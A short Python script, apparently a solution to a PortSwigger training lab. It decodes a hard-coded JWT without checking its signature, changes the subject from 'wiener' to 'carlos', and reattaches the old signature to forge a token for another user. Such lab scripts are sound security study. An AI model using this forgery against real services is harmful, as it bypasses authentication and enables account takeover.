import jwt
import base64

# Paste JWT token here
token = 'eyJraWQiOiI1M2FmMDM2Yi04YjY3LTQ3NmItODE4Yy0xMGQxYTM3ZmUyZWIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3NTM4NTQzMiwic3ViIjoid2llbmVyIn0.2djoRFi5z4jxULZWDd9_AW2nSVbGG8uktUzLUFZ5tsCUtyKuPypxoe0hvoMQRMP_ngty3QKfToK4-G5iCGg_BOM7t36S4AucfbENfWs-W1HGmcBhFn7e488icDxMaHJrrEN40BTe-4RNHbnbocL66n1KqulVMArUEdBw_m1NXgpGsOJrEt7RP85_tkUPzX8PrvQsSchlZo0Dw3kl5KWIeXt4VXInfyLPAGzQD5aYhLDyPaNY0bAB2FITt93-zhCyuoQSlj2Cry_Ucr_liz36xnkEsOojUjGJ-iPbWoR7XcJRHszeocDH14uivQlUDCguMmlfxOBBbRq4RyVaV5bNzQ'

# Decode the token (without verifying)
payload = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token: {payload}\n")

# Modify the token (JWT manipulation)
header, payload, signature = token.split('.')

decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
modified_payload = decoded_payload.replace(b'wiener', b'carlos')
print(f"Modified payload: {modified_payload.decode()}\n")

# Generate a new token with the modified payload (re-encode)
modified_payload_b64 = base64.urlsafe_b64encode(modified_payload).rstrip(b'=').decode()
modified_token = f"{header}.{modified_payload_b64}.{signature}"

print(f"Modified token: {modified_token}\n")


